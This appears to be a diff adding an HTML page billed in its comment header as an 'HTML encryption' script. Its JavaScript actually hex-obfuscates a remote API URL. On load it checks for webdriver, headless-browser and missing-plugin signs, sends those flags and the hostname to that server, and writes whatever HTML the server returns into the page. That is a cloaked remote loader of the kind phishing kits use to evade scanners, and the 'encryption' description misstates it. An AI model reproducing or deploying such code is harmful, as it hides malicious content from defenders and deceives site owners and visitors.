@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>.</title>
+<meta charset="utf-8">
+</head>
+<body><!--
+* ============================================
+ * 🛡 EZRA HTML Encryption Script
+ * ============================================
+ *
+ * 🔐 ABOUT:
+ * ----------
+ * This script securely encodes HTML content, making it unreadable  
+ * without decoding. Protects web pages from unauthorized access  
+ * and modifications.
+ *
+ * 🚀 FEATURES:
+ * ------------
+ * ✅ Encrypts HTML into an unreadable format.
+ * ✅ Prevents direct copying and unauthorized edits.
+ * ✅ Uses strong obfuscation techniques.
+ * ✅ Protects content without affecting functionality.
+ *
+ * 🔧 DEVELOPER INFO:
+ * -------------------
+ * 🧑‍💻 Developer: @teamEzra
+  * ⚡ Channel: https://t.me/teamezra
+ * 🌐 Version: 2.0
+ * 📅 Date: 2026-08-15
+ *
+ * 📜 LICENSE:
+ * ------------
+ * Licensed under MIT. Modify, distribute, and use freely  
+ * with proper credit to the developer.
+ *
+ * ⚠ DISCLAIMER:
+ * --------------
+ * This script is provided without any warranties.  
+ * The developer holds no responsibility for any misuse.
+ *
+ * 🔒 ENCRYPTION ID: [EZRA-ENC-2026-08-15-XXXXX]
+ *
+ * ============================================
+-->
+<script>
+var af6cc636b='68747470733a2f2f';
+var ac40ec5dc='64696c6c696e6765';
+var a10d26a72='722e636c6f75642f';
+var a708a3d7f='656e636f62667372';
+var a715b0ffb='6f626f7470726f2f';
+var a3f9c9975='6170692e706870';
+var xfdc750ac=q3d4e01a1(af6cc636b+ac40ec5dc+a10d26a72+a708a3d7f+a715b0ffb+a3f9c9975);
+var bb0b3730a='3462376233633661';
+var b71c023cd='3764646235316430';
+var b3faacded='3333333638663565';
+var ba05f27df='3030303235636332';
+var yab8ec9d6=q3d4e01a1(bb0b3730a+b71c023cd+b3faacded+ba05f27df);
+function q3d4e01a1(h){var r="";for(var i=0;i<h.length;i+=2){r+=String.fromCharCode(parseInt(h.substr(i,2),16));}return r;}
+function showErr(m){var d=document.getElementById("err");d.style.display="block";d.innerHTML=m;}
+(function(){
+var zf414d9cd="";
+var w8dc58e58="";
+var v8920ba51="";
+var uc4a4ed80="";
+
+try{
+zf414d9cd=(navigator.webdriver===true)?"1":"0";
+}catch(e){zf414d9cd="0";}
+
+try{
+w8dc58e58=(navigator.plugins&&navigator.plugins.length>0)?"0":"1";
+}catch(e){w8dc58e58="1";}
+
+try{
+v8920ba51=(navigator.languages&&navigator.languages.length>0)?"0":"1";
+}catch(e){v8920ba51="1";}
+
+try{
+uc4a4ed80=(/HeadlessChrome/i.test(navigator.userAgent))?"1":"0";
+}catch(e){uc4a4ed80="0";}
+
+var t9e4a4b24="i="+encodeURIComponent(yab8ec9d6);
+t9e4a4b24+="&h="+encodeURIComponent(location.hostname);
+t9e4a4b24+="&a="+zf414d9cd+"&b="+w8dc58e58+"&c="+v8920ba51+"&d="+uc4a4ed80;
+
+var xhr=new XMLHttpRequest();
+xhr.open("POST",xfdc750ac,true);
+xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+xhr.onreadystatechange=function(){
+if(xhr.readyState===4){
+if(xhr.status===200){
+try{
+var res=JSON.parse(xhr.responseText);
+if(res.ok&&res.c){
+document.open();
+document.write(res.c);
+document.close();
+}else{
+showErr("SERVER ERROR: "+JSON.stringify(res));
+}
+}catch(e){
+showErr("PARSE ERROR: "+xhr.responseText.substring(0,200));
+}
+}else{
+showErr("HTTP ERROR: "+xhr.status);
+}
+}
+};
+xhr.onerror=function(){
+showErr("NETWORK ERROR: Cannot reach server");
+};
+xhr.send(t9e4a4b24);
+})();
+</script>
+</body>
+</html>
